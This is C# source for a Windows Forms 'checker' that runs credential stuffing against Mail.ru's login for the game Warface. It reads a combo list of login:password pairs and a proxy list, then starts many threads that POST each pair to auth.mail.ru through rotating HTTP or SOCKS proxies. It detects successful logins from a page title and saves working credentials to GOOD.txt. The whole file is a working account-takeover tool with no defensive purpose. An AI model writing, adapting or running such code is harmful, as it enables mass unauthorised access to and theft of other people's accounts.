using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using MetroFramework;
using MetroFramework.Forms;
using xNet;

namespace WindowsFormsApp23
{
	public partial class Form1 : MetroForm
	{
		Object locker = new object();
		bool bwork = false;
		public static int iGood = 0, iBad = 0, iPrx = 0, iThrd = 0, iError = 0, iAccs = 0, iBal = 0;

		public string path = "Result_Check\\";
		public static List<string> Prxs = new List<string>();
		StreamReader stream;
		int ind;
		DataTable dt = new DataTable();
		DataRow r;
		public Form1()
		{
			InitializeComponent();
			string[] it = new string[3] {"HTTP", "Socks4", "Socks5" };
			metroComboBox1.Items.AddRange(it);
			Directory.CreateDirectory(path);

			dt.Columns.Add("Логин");
			dt.Columns.Add("Пароль");
			dt.Columns.Add("Привязка");

		}

		private void metroTextBox1_KeyPress(object sender, KeyPressEventArgs e)
		{
			if ((e.KeyChar <= 48 || e.KeyChar >= 59) && e.KeyChar != 8)
				e.Handled = true;
		}

		private void metroButton3_Click(object sender, EventArgs e)
		{
			System.Diagnostics.Process.Start("explorer", "Result_Check");

		}

		private void metroButton1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFile = new OpenFileDialog();
				if (openFile.ShowDialog() == DialogResult.OK)
				{
					stream = File.OpenText(openFile.FileName);
					iAccs = File.ReadAllLines(openFile.FileName).Length;
					allcount.Text = iAccs.ToString();

				}

			}
			catch
			{ }
		}

		private void metroButton2_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFile = new OpenFileDialog();
			if (openFile.ShowDialog() == DialogResult.OK)
			{
				Prxs.Clear();
				iPrx = File.ReadAllLines(openFile.FileName).Length;
				ProxyCount.Text = iPrx.ToString();
				Prxs.AddRange(File.ReadLines(openFile.FileName));
				GC.Collect();

			}
		}

		private void metroButton4_Click(object sender, EventArgs e)
		{
			bwork = true;
			for (int i = 0; i < int.Parse(metroTextBox1.Text); i++)
			{
				Thread tr = new Thread(Fthread);
				tr.Start();
			}
		}

		void Fthread()

		{
			while (bwork)
			{
				try
				{
					string acc = string.Empty;
					lock (locker)
					{
						if ((acc = stream.ReadLine()) == null)
						{
							bwork = false;
							break;
						}

					}
					check(acc.Split(new[] { ':', ';', ' ' })[0].Trim(),acc.Split( new[] { ':',';', ' '})[1].Trim());
				}
				finally
				{
				}
			}

		}

		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			System.Diagnostics.Process.GetCurrentProcess().Kill();
		}

		private string getProxy()
		{
			lock (this)
			{
				if (Prxs.Count <= iPrx)
					iPrx = -1;
				return Prxs[++iPrx];
			}
		}
		void check(string login,string pass)
		{
			using (HttpRequest req = new HttpRequest())
			{
				try
				{
					if (Prxs.Count > 0)
					{
						switch (ind)
						{
							case 0:
								req.Proxy = HttpProxyClient.Parse(getProxy());
								req.Proxy.ConnectTimeout = 10000;
								req.Proxy.ReadWriteTimeout = 10000;
								break;
							case 1:
								req.Proxy = Socks4ProxyClient.Parse(getProxy());
								req.Proxy.ConnectTimeout = 10000;
								req.Proxy.ReadWriteTimeout = 10000;
								break;
							case 2:
								req.Proxy = Socks5ProxyClient.Parse(getProxy());
								req.Proxy.ConnectTimeout = 10000;
								req.Proxy.ReadWriteTimeout = 10000;
								break;

						}
					}
					var cookie = new CookieDictionary();

				
					req.KeepAlive = true;
					req.AddHeader("Origin", "https://my.mail.ru");
					req.AddHeader("Referer", "https://wf.mail.ru/profile/mycart/");
					req.UserAgent = Http.FirefoxUserAgent();
						req.Cookies = new CookieDictionary()
							{
								{"key","value"}
							};



						RequestParams pairs = new RequestParams();
					pairs["page"] = "https://wf.mail.ru/profile/mycart/";
					pairs["FailPage"] = "https://wf.mail.ru/auth";

					pairs["Login"] = login;
					pairs["Password"] = pass;
					pairs["saveauth"] = "1";



					pairs["token"] = "b42ab909fa634d2784eb7afe8d2c1244";
					pairs["project"] = "e.mail.ru_:1553649855751";

					string reposne = req.Post("https://auth.mail.ru/cgi-bin/auth", pairs, true).ToString();
					RequestParams pairs1 = new RequestParams();
					cookie = req.Cookies;

					req.AddHeader("Referer", "https://wf.mail.ru/profile/mycart/");

					pairs1["do"] = "auth";
					string reposne1 = req.Post("https://wf.mail.ru/dynamic/user/check_data.php?do=auth", pairs1, true).ToString();


					RequestParams pairs2 = new RequestParams();
					cookie = req.Cookies;

					req.AddHeader("Referer", "https://wf.mail.ru/profile/");

					pairs2["a"] = "profile";
					string reposne2 = req.Post("https://wf.mail.ru/dynamic/profile/?a=profile", pairs2, true).ToString();


				//	< div class="phone__added-number">+38098829****</div>


					if (reposne.Contains("Мои предметы | WARFACE"))

						{
							r = dt.NewRow();

							r["Логин"] = login;
							r["Пароль"] = pass;

							dt.Rows.Add(r);
							_good(login, pass);


						}
						else
						{
							_bad(login, pass);

							


						}

					metroGrid1.DataSource = dt;

					update();

				}
				catch (Exception ex)
				{
					update();

					iError++;
					check(login, pass);
					
				}
			}
		}

		void update()
		{
			try
			{
				lock (this)
				{
					Invoke(new MethodInvoker(() =>
					{
					goodcount.Text = iGood.ToString(); badcount.Text = iBad.ToString();errorcount.Text = iError.ToString();


					}));
				}
			}
			catch
			{ }
		}


		void _good(string login, string pass)
		{
			lock (this)
			{
				iGood++;
				File.AppendAllText(path + $"\\GOOD.txt", $"{login}:{pass}\r\n");
				update();
			}
		}
		void _bad(string login, string pass)
		{
			lock (this)
			{
				iBad++;
				File.AppendAllText(path + $"\\_bad.txt", $"{login}:{pass}\r\n");
				update();
			}
		}
		private void metroComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			ind=metroComboBox1.SelectedIndex;
		}
	}
}
